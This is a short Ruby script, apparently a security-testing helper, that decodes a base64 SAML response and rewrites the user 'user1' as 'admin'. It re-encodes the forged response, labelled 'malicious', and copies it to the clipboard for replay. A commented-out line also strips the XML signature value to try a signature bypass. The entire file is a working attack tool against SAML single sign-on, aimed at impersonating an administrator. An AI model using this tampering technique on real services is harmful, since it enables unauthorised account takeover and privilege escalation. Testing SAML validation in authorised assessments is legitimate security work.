require 'uri'
require 'base64'

str = URI.unescape ARGV[0]
response = Base64.decode64(str)
File.write("original_response.xml", response)


malicious_response = response.gsub("user1", "admin")

File.write("malicious_response.xml", malicious_response)

#without_signature = malicious_response.gsub(/<ds:SignatureValue>.*$\/ds:SignatureValue>/, "<ds:SignatureValue></ds:SignatureValue>") 
#output = URI.escape(Base64.strict_encode64(without_signature),"+/=")

output = URI.escape(Base64.strict_encode64(malicious_response),"+/=")


IO.popen('pbcopy', 'w') { |f| f << output }
puts ""
puts "Response saved to riginal_response.xml file."
puts "Malicious Response saved to malicious_response.xml file."
puts "Output copied to clipboard!"

system('open', '-a', 'Google Chrome', 'original_response.xml'); 
system('open', '-a', 'Google Chrome', 'malicious_response.xml')
